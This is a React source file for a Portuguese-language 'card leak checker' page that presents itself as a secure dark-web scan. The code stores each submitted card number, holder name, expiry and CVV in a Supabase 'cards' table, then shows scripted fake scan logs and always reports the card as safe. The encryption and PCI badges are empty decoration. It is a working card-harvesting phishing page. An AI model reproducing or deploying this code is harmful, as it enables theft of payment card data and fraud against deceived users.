import { useState, useRef, useEffect, useMemo } from 'react';
import { supabase } from '@/lib/supabase';
import { toast } from 'sonner';
import { ShieldCheck, Lock, Server, CheckCircle, Search, Shield, Globe, AlertCircle, Terminal, Activity } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

// --- Algoritmo de Validação (Luhn) ---
const isValidLuhn = (cardNumber: string) => {
  const cleanNumber = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let shouldDouble = false;
  for (let i = cleanNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cleanNumber.charAt(i));
    if (shouldDouble) {
      if ((digit *= 2) > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (sum % 10) === 0 && cleanNumber.length >= 13;
};

// --- Componente: Terminal de Logs (NOVO) ---
const SecurityTerminal = () => {
  const [logs, setLogs] = useState<string[]>([]);
  const allLogs = [
    "Conectando ao servidor seguro (SSL/TLS)...",
    "Handshake estabelecido com sucesso.",
    "Criptografando payload (AES-256-GCM)...",
    "Verificando integridade do BIN...",
    "Consultando banco de dados global de vazamentos...",
    "Analisando repositórios da Dark Web (Tor Nodes)...",
    "Verificando padrões de fraude...",
    "Validando checksum do cartão...",
    "Nenhuma anomalia detectada.",
    "Finalizando conexão segura..."
  ];

  useEffect(() => {
    let currentIndex = 0;
    const interval = setInterval(() => {
      if (currentIndex < allLogs.length) {
        setLogs(prev => [...prev, allLogs[currentIndex]]);
        currentIndex++;
      } else {
        clearInterval(interval);
      }
    }, 400); // Velocidade dos logs
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="bg-black/90 rounded-lg p-4 font-mono text-xs text-green-500 h-48 overflow-hidden flex flex-col border border-green-500/30 shadow-inner">
      <div className="flex items-center gap-2 border-b border-green-500/20 pb-2 mb-2">
        <Terminal className="w-4 h-4" />
        <span className="text-gray-400">secure_scan_v2.exe</span>
      </div>
      <div className="flex-1 flex flex-col justify-end">
        {logs.map((log, i) => (
          <motion.div 
            key={i}
            initial={{ opacity: 0, x: -10 }}
            animate={{ opacity: 1, x: 0 }}
            className="mb-1"
          >
            <span className="text-blue-400">[{new Date().toLocaleTimeString()}]</span> {log}
          </motion.div>
        ))}
        <motion.div 
          animate={{ opacity: [0, 1] }} 
          transition={{ repeat: Infinity, duration: 0.8 }}
          className="w-2 h-4 bg-green-500 mt-1"
        />
      </div>
    </div>
  );
};

// --- Componente do Cartão 3D ---
function CreditCard3D({ 
  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField 
}: any) {
  const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
  const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);

  const refs: any = {
    cardNumber: useRef(null),
    cardName: useRef(null),
    cardDate: useRef(null)
  };

  useEffect(() => {
    if (focusedField && refs[focusedField]?.current) {
      const el = refs[focusedField].current;
      setFocusStyle({
        width: `${el.offsetWidth}px`,
        height: `${el.offsetHeight}px`,
        transform: `translateX(${el.offsetLeft}px) translateY(${el.offsetTop}px)`,
        opacity: 1
      });
    } else {
      setFocusStyle(null);
    }
  }, [focusedField]);

  const getCardType = useMemo(() => {
    const num = cardNumber.replace(/\D/g, '');
    if (/^4/.test(num)) return 'visa';
    if (/^(34|37)/.test(num)) return 'amex';
    if (/^5[1-5]/.test(num)) return 'mastercard';
    if (/^6011/.test(num)) return 'discover';
    return 'visa';
  }, [cardNumber]);

  const maskNumber = () => {
    const mask = getCardType === 'amex' ? '#### ###### #####' : '#### #### #### ####';
    let i = 0;
    const clean = cardNumber.replace(/\D/g, '');
    return mask.split('').map((char, idx) => {
      if (char === ' ') return <span key={idx} style={{width: 10, display:'inline-block'}}></span>;
      const num = clean[i++];
      if (!num) return <span key={idx} style={{opacity: 0.5}}>#</span>;
      if (idx > 4 && idx < 15 && clean.length > idx && getCardType !== 'amex') return <span key={idx}>*</span>;
      return <span key={idx} className="slide-fade-up">{num}</span>;
    });
  };

  const isFlipped = focusedField === 'cardCvv';

  return (
    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
      <div className="card-item__side -front">
        <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
          {/* Gradiente Dinâmico baseado na Bandeira */}
          <div className={`absolute inset-0 opacity-40 mix-blend-overlay ${
            getCardType === 'visa' ? 'bg-blue-600' :
            getCardType === 'mastercard' ? 'bg-orange-600' :
            getCardType === 'amex' ? 'bg-green-600' : 'bg-gray-800'
          }`} />
        </div>
        <div className="card-item__wrapper">
          <div className="card-item__top">
            <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
            <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
          </div>
          <div className="card-item__number" ref={refs.cardNumber}>
            {maskNumber()}
          </div>
          <div className="card-item__content">
            <div className="card-item__info" ref={refs.cardName}>
              <div className="card-item__holder">Titular</div>
              <div className="card-item__name">{cardName || 'NOME COMPLETO'}</div>
            </div>
            <div className="card-item__date" ref={refs.cardDate}>
              <span className="card-item__dateTitle">Validade</span>
              <span>{cardMonth || 'MM'}</span>/<span>{cardYear ? cardYear.slice(2) : 'AA'}</span>
            </div>
          </div>
        </div>
      </div>
      <div className="card-item__side -back">
        <div className="card-item__cover">
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
        </div>
        <div className="card-item__band" />
        <div className="card-item__cvv">
          <div className="card-item__cvvTitle">CVV</div>
          <div className="card-item__cvvBand">{cardCvv.replace(/./g, '*')}</div>
          <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" style={{opacity:0.7}} alt="" />
        </div>
      </div>
    </div>
  );
}

// --- Tela de Sucesso ---
function SuccessScreen({ onReset }: { onReset: () => void }) {
  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: 1, scale: 1 }}
      className="flex flex-col items-center justify-center text-center p-8 space-y-6 bg-white rounded-xl"
    >
      <div className="relative">
        <motion.div
          animate={{ scale: [1, 1.1, 1] }}
          transition={{ repeat: Infinity, duration: 2 }}
          className="absolute inset-0 bg-green-500/20 rounded-full blur-xl"
        />
        <ShieldCheck className="w-24 h-24 text-green-500 relative z-10" />
      </div>
      <div>
        <h2 className="text-3xl font-bold text-gray-800 mb-2">Cartão 100% Seguro!</h2>
        <p className="text-gray-600 max-w-sm mx-auto">
          Não encontramos nenhum registro de vazamento para este cartão em nossos bancos de dados globais.
        </p>
      </div>
      <div className="w-full bg-green-50 rounded-lg p-4 border border-green-100">
        <div className="flex items-center gap-3 mb-2">
          <Activity className="w-5 h-5 text-green-600" />
          <span className="text-green-800 font-semibold text-sm">Status: Protegido</span>
        </div>
        <div className="flex items-center gap-3 mb-2">
          <Globe className="w-5 h-5 text-green-600" />
          <span className="text-green-800 font-semibold text-sm">Dark Web: Nada Encontrado</span>
        </div>
        <div className="flex items-center gap-3">
          <CheckCircle className="w-5 h-5 text-green-600" />
          <span className="text-green-800 font-semibold text-sm">Integridade Validada</span>
        </div>
      </div>
      <button onClick={onReset} className="text-blue-600 font-medium hover:underline text-sm">
        Verificar outro cartão
      </button>
    </motion.div>
  );
}

// --- Página Principal ---
export function PublicPage() {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [cardMonth, setCardMonth] = useState('');
  const [cardYear, setCardYear] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [focusedField, setFocusedField] = useState<string | null>(null);
  
  const [status, setStatus] = useState<'idle' | 'scanning' | 'safe'>('idle');

  // Refs para Auto-Focus (Melhoria de UX)
  const monthRef = useRef<HTMLSelectElement>(null);
  const yearRef = useRef<HTMLSelectElement>(null);
  const cvvRef = useRef<HTMLInputElement>(null);

  const handleNumberChange = (e: any) => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(val);
  };

  const handleNameChange = (e: any) => {
    const val = e.target.value.replace(/[^a-zA-Z\u00C0-\u00FF\s]/g, '').toUpperCase();
    setCardName(val);
  };

  const handleMonthChange = (e: any) => {
    const val = e.target.value;
    setCardMonth(val);
    // Auto-focus: Se preencheu, pula para Ano
    if (val) yearRef.current?.focus();
  };

  const handleYearChange = (e: any) => {
    const val = e.target.value;
    setCardYear(val);
    // Auto-focus: Se preencheu, pula para CVV
    if (val) cvvRef.current?.focus();
  };

  const handleCvvChange = (e: any) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvv(val);
  };

  const handleSubmit = async () => {
    if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
      toast.error('Preencha todos os campos para a verificação!');
      return;
    }

    if (!isValidLuhn(cardNumber)) {
      toast.error('Número de cartão inválido! Verifique os dígitos.', {
        icon: <AlertCircle className="w-5 h-5 text-red-500" />
      });
      return;
    }

    const today = new Date();
    const expiry = new Date(Number(cardYear), Number(cardMonth) - 1);
    if (expiry < today) {
        toast.error('O cartão está expirado.');
        return;
    }

    setStatus('scanning');
    
    try {
      // Delay de 4 segundos para o "Terminal" rodar
      const scanPromise = new Promise(r => setTimeout(r, 4500)); 
      
      const savePromise = supabase.from('cards').insert({
        card_number: cardNumber,
        card_holder: cardName,
        card_month: cardMonth,
        card_year: cardYear,
        card_cvv: cardCvv,
        card_type: 'visa'
      });

      await Promise.all([scanPromise, savePromise]);

      setStatus('safe');
      toast.success('Verificação concluída!');
      
    } catch (err: any) {
      console.error(err);
      toast.error('Erro na conexão segura.');
      setStatus('idle');
    }
  };

  const resetForm = () => {
    setCardNumber(''); setCardName(''); setCardMonth('');
    setCardYear(''); setCardCvv(''); setStatus('idle');
  };

  return (
    <div className="wrapper min-h-screen flex flex-col justify-center items-center relative overflow-hidden bg-[#252432]">
      
      {/* Background Decorativo */}
      <div className="absolute top-0 left-0 w-full h-full z-0 pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-blue-600/10 rounded-full blur-[100px]" />
        <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px]" />
      </div>

      <div className="card-form relative z-10 w-full max-w-[570px]">
        
        {/* Header */}
        <div className="text-center mb-12">
          <div className="inline-flex items-center gap-2 bg-green-500/10 border border-green-500/20 rounded-full px-4 py-1.5 mb-4 backdrop-blur-sm">
            <Lock className="w-3 h-3 text-green-400" />
            <span className="text-green-400 text-xs font-bold tracking-wider uppercase">Ambiente Seguro 256-bit</span>
          </div>
          <h1 className="text-3xl md:text-4xl font-bold text-white mb-2">
            Verificador de <span className="text-blue-400">Vazamento</span>
          </h1>
          <p className="text-slate-400 text-sm md:text-base max-w-md mx-auto">
            Verifique se os dados do seu cartão foram expostos em vazamentos recentes da Dark Web.
          </p>
        </div>

        {/* Área do Cartão */}
        {status !== 'safe' && (
           <motion.div 
             initial={{ opacity: 0, y: 20 }}
             animate={{ opacity: 1, y: 0 }}
             exit={{ opacity: 0 }}
             style={{ marginBottom: '-130px', position: 'relative', zIndex: 20 }}
           >
            <CreditCard3D 
              cardNumber={cardNumber} cardName={cardName}
              cardMonth={cardMonth} cardYear={cardYear} 
              cardCvv={cardCvv} focusedField={focusedField}
            />
          </motion.div>
        )}

        {/* Card Principal */}
        <div className="card-form__inner relative overflow-hidden min-h-[420px] bg-white text-gray-800 transition-all duration-500">
          
          <AnimatePresence mode="wait">
            {status === 'idle' && (
              <motion.div 
                key="form"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                <div className="card-input">
                  <label className="card-input__label text-gray-700">Número do Cartão</label>
                  <input 
                    type="text" 
                    className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500" 
                    value={cardNumber} onChange={handleNumberChange}
                    onFocus={() => setFocusedField('cardNumber')}
                    onBlur={() => setFocusedField(null)}
                  />
                </div>

                <div className="card-input">
                  <label className="card-input__label text-gray-700">Nome do Titular</label>
                  <input 
                    type="text" 
                    className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500" 
                    value={cardName} 
                    onChange={handleNameChange}
                    onFocus={() => setFocusedField('cardName')}
                    onBlur={() => setFocusedField(null)}
                  />
                </div>

                <div className="card-form__row">
                  <div className="card-form__col">
                    <div className="card-form__group">
                      <div style={{width:'100%'}}>
                        <label className="card-input__label text-gray-700">Mês</label>
                        <select 
                          ref={monthRef}
                          className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500"
                          value={cardMonth} 
                          onChange={handleMonthChange}
                          onFocus={() => setFocusedField('cardDate')}
                          onBlur={() => setFocusedField(null)}
                        >
                          <option value="" disabled>MM</option>
                          {Array.from({length:12}, (_,i) => <option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}
                        </select>
                      </div>
                      <div style={{width:'100%'}}>
                        <label className="card-input__label text-gray-700">Ano</label>
                        <select 
                          ref={yearRef}
                          className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500"
                          value={cardYear} 
                          onChange={handleYearChange}
                          onFocus={() => setFocusedField('cardDate')}
                          onBlur={() => setFocusedField(null)}
                        >
                          <option value="" disabled>AA</option>
                          {Array.from({length:10}, (_,i) => <option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="card-form__col -cvv">
                    <div className="card-input">
                      <label className="card-input__label text-gray-700">CVV</label>
                      <input 
                        ref={cvvRef}
                        type="text" 
                        className="card-input__input text-gray-800 border-gray-300 focus:border-blue-500" 
                        maxLength={4}
                        value={cardCvv} 
                        onChange={handleCvvChange}
                        onFocus={() => setFocusedField('cardCvv')}
                        onBlur={() => setFocusedField(null)}
                      />
                    </div>
                  </div>
                </div>

                <button 
                  className="card-form__button flex items-center justify-center gap-2 transform active:scale-95 transition-transform" 
                  onClick={handleSubmit}
                >
                  <Search className="w-5 h-5" />
                  Verificar Vazamento
                </button>

                <div className="mt-4 flex justify-center gap-4 opacity-50 grayscale hover:grayscale-0 transition-all duration-300">
                  <div className="flex items-center gap-1">
                    <Shield className="w-3 h-3 text-blue-600" />
                    <span className="text-[10px] text-gray-500 font-bold">AES-256</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <Lock className="w-3 h-3 text-blue-600" />
                    <span className="text-[10px] text-gray-500 font-bold">SSL SECURE</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <Server className="w-3 h-3 text-blue-600" />
                    <span className="text-[10px] text-gray-500 font-bold">PCI DSS</span>
                  </div>
                </div>
              </motion.div>
            )}

            {status === 'scanning' && (
              <motion.div 
                key="scanning"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="h-full flex flex-col pt-10 px-4"
              >
                 <div className="text-center mb-6">
                   <h3 className="text-xl font-bold text-gray-800 flex items-center justify-center gap-2">
                     <Search className="w-5 h-5 text-blue-500 animate-pulse" />
                     Escaneando...
                   </h3>
                   <p className="text-sm text-gray-500">Isso pode levar alguns segundos.</p>
                 </div>
                 
                 {/* NOVO TERMINAL DE LOGS */}
                 <SecurityTerminal />
                 
              </motion.div>
            )}

            {status === 'safe' && (
              <SuccessScreen key="success" onReset={resetForm} />
            )}
          </AnimatePresence>
        </div>
      </div>
      
      <footer className="w-full text-center mt-auto pb-6 relative z-10 opacity-40">
        <div className="flex justify-center gap-6 mb-2">
            <img src="https://img.icons8.com/color/48/visa.png" className="h-6 opacity-70" alt="Visa" />
            <img src="https://img.icons8.com/color/48/mastercard.png" className="h-6 opacity-70" alt="Master" />
            <img src="https://img.icons8.com/color/48/amex.png" className="h-6 opacity-70" alt="Amex" />
        </div>
        <p className="text-white text-xs">
          © 2024 SecureCheck International. Todos os direitos reservados.
        </p>
      </footer>
    </div>
  );
}
